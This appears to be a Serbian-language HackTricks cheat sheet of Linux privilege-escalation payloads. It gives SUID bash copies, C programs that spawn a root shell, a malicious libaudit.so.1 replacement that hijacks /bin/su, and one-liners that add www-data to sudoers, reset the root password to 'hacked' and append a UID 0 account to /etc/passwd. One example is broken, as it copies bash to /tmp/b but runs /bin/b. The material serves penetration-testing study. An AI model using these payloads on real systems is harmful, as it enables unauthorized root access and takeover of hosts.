# Payloads to execute

## Bash

`bash -p` omogućava privileged mode: kada se Bash pokrene sa različitim stvarnim i efektivnim ID-ovima, ne resetuje efektivni ID na stvarni ID. Dobijeni shell i dalje zavisi od postojećih kredencijala pozivaoca.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid` menja stvarni, efektivni i sačuvani ID kada je to dozvoljeno, dok `setuid` menja efektivni ID i može takođe postaviti stvarni i sačuvani ID za privilegovanog pozivaoca. `execve` zamenjuje sliku trenutnog procesa zahtevanym programom.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> Ovi primeri izostavljaju provere povratnih vrednosti; oba poziva za promenu akreditiva mogu da ne uspeju čak i za UID 0.<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Prepisivanje datoteke radi eskalacije privilegija

### Uobičajene datoteke

Ovo su uobičajene lokalne datoteke i interfejsi za kontrolu privilegija: `/etc/passwd` čuva zapise naloga sa sedam polja, `/etc/shadow` čuva opcione šifrovane podatke o lozinkama, `sudoers` definiše sudo privilegije i oznake kao što je `NOPASSWD`, a podrazumevana krajnja tačka Docker daemona je Unix socket na adresi `/var/run/docker.sock`; pristup tom socketu može omogućiti kontrolu nad hostom na nivou root-a.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Dodati korisnika sa lozinkom u _/etc/passwd_
- Promeniti lozinku unutar _/etc/shadow_
- Dodati korisnika u sudoers u _/etc/sudoers_
- Zloupotrebiti Docker preko Docker socketa, koji se obično nalazi na _/run/docker.sock_ ili _/var/run/docker.sock_

### Prepisivanje biblioteke

Proveriti koje shared libraries koristi neki binary; u ovom primeru pregledati `/bin/su` pomoću `ldd`.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd` prikazuje zavisnosti deljenih objekata, dok dinamički linker koristi ELF metapodatke i svoja pravila pretrage da ih učita tokom izvršavanja.<sup>[[9]](#references)[[10]](#references)</sup>

Da biste pregledali jednog kandidata, koristite `objdump -T` za ispis dinamičke tabele simbola programa `su` i filtrirajte audit nazive.<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_user_message` i `audit_log_acct_message` su libaudit funkcije; `audit_fd` je u ovom izlazu prikazan kao data object definisan u `.bss` delu programa `su`.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Replacement library mora da eksportuje kompatibilne definicije za nedefinisane simbole koje loader razrešava; neusklađeni function/data ABI-ji i dalje mogu dovesti do otkazivanja procesa kada se ti simboli relokiraju ili pozovu.<sup>[[10]](#references)[[11]](#references)</sup>

GCC-ov `constructor` attribute uzrokuje da se `inject` automatski pozove pre funkcije `main` na podržanim targetima.<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Ako je zamena uspešno učitana od strane privilegovanog procesa **`/bin/su`**, ovaj konstruktor može pokrenuti **`/bin/bash`** sa privilegijama tog procesa; tačan rezultat zavisi od okruženja.<sup>[[10]](#references)[[15]](#references)</sup>

## Skripte

Možete li naterati root da izvrši nešto?

`sudoers` koristi oznaku `NOPASSWD` u policy unosima, `chpasswd` čita parove `user:password` sa standardnog ulaza, a `/etc/passwd` koristi sedam poljima naloga razdvojenih dvotačkama; sledeći primeri pretpostavljaju da su relevantne datoteke upisive za proces koji ih izvršava.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data u sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Promena root lozinke**
```bash
echo "root:hacked" | chpasswd
```
### Dodavanje novog root korisnika u /etc/passwd

Konačni payload zavisi od targeta koji prihvata generisani `crypt` hash: Debian-ov `mkpasswd -m sha-512` koristi SHA-512 crypt (`$6$`), dok OpenSSL-ov `passwd -1 -salt` koristi BSD algoritam zasnovan na MD5 (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [Ugrađena komanda Set (Bash Reference Manual)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — stranica Linux priručnika](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — stranica Linux priručnika](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — stranica Linux priručnika](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — stranica Linux priručnika](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Debian Manpages](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Zaštita Docker daemon socket-a](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Docker dokumentacija](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — stranica Linux priručnika](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — stranica Linux priručnika](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (GNU binarni alati)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Debian Manpages](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Debian Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Debian Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Uobičajeni atributi (Using the GNU Compiler Collection)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — stranica Linux priručnika](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Debian Sources](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — OpenSSL dokumentacija](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
